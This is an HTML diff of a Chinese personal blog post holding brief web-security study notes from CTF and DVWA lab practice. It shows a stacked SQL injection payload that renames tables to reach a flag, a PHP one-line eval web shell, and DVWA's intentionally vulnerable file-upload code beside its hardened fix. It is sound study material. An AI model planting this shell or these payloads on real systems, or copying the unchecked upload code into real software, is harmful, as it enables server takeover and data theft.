@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>嚚瘖的个人博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SQL注入1234rename table &#96;words&#96; to words2;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show tables;      文件上传1.一句话木马 1&lt;?php @eval($_POST[&amp;#x27;pass&amp;#x27;]);?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嚚瘖的个人博客">
+<meta property="og:url" content="https://cczz1234.github.io/2022/08/05/web/index.html">
+<meta property="og:site_name" content="嚚瘖的个人博客">
+<meta property="og:description" content="SQL注入1234rename table &#96;words&#96; to words2;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100);show tables;      文件上传1.一句话木马 1&lt;?php @eval($_POST[&amp;#x27;pass&amp;#x27;]);?">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-05T03:03:44.583Z">
+<meta property="article:modified_time" content="2022-08-05T02:47:44.456Z">
+<meta property="article:author" content="嚚瘖">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="嚚瘖的个人博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">嚚瘖的个人博客</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">I love you</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cczz1234.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/05/web/" class="article-date">
+  <time class="dt-published" datetime="2022-08-05T03:03:44.583Z" itemprop="datePublished">2022-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to words2;</span><br><span class="line">rename table `1919810931114514` to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>1.一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>漏洞代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;</span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder?</span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;</span><br><span class="line">        // No</span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Yes!</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>漏洞解决</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information</span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);</span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];</span><br><span class="line">    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;</span><br><span class="line">    //$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    // Is it an image?</span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">        if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, 100);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, 9);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder?</span><br><span class="line">        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            // Yes!</span><br><span class="line">            echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // No</span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Delete any temp files</span><br><span class="line">        if( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Invalid file</span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cczz1234.github.io/2022/08/05/web/" data-id="cl6fvvmkm0008msu9c7seekyc" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/05/mysql/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">buuctf--[ACTF新生赛2020]usualCrypt1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/05/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/05/mysql/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/05/web/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/">buuctf--[ACTF新生赛2020]usualCrypt1</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/22/CrackRTF-1-buuctf/">CrackRTF 1---buuctf</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 嚚瘖<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
